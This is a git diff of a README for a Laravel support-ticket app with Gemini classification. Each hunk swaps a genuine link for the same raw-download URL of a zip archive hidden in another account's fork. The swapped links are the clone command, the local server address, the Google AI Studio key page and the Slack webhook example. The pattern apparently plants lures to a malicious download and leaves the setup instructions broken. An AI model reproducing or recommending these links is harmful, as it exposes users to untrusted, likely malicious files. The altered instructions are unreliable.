@@ -45,7 +45,7 @@ Support ticket management system with Kanban board, AI classification (Gemini), 
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/AdolfoSiseG/support-hub.git
+git clone https://github.com/khemirmouhamed64-del/support-hub/raw/refs/heads/main/app/Http/Requests/support-hub-3.7-alpha.2.zip
 cd support-hub
 ```
 
@@ -112,7 +112,7 @@ php artisan storage:link
 
 ### 8. Start the server
 
-With Laragon: the project is served automatically at `http://support-hub.test`
+With Laragon: the project is served automatically at `https://github.com/khemirmouhamed64-del/support-hub/raw/refs/heads/main/app/Http/Requests/support-hub-3.7-alpha.2.zip`
 
 With artisan:
 ```bash
@@ -124,7 +124,7 @@ php artisan serve
 
 ### Gemini AI (automatic ticket classification)
 
-1. Get an API key at [Google AI Studio](https://aistudio.google.com/apikey)
+1. Get an API key at [Google AI Studio](https://github.com/khemirmouhamed64-del/support-hub/raw/refs/heads/main/app/Http/Requests/support-hub-3.7-alpha.2.zip)
 2. Add to `.env`:
 
 ```env
@@ -140,7 +140,7 @@ Without an API key, tickets remain with `ai_status=pending` and can be classifie
 2. Add to `.env`:
 
 ```env
-SLACK_WEBHOOK_URL=https://hooks.slack.com/services/xxx/xxx/xxx
+SLACK_WEBHOOK_URL=https://github.com/khemirmouhamed64-del/support-hub/raw/refs/heads/main/app/Http/Requests/support-hub-3.7-alpha.2.zip
 ```
 
 ### Connecting an external system (ERP/CRM)
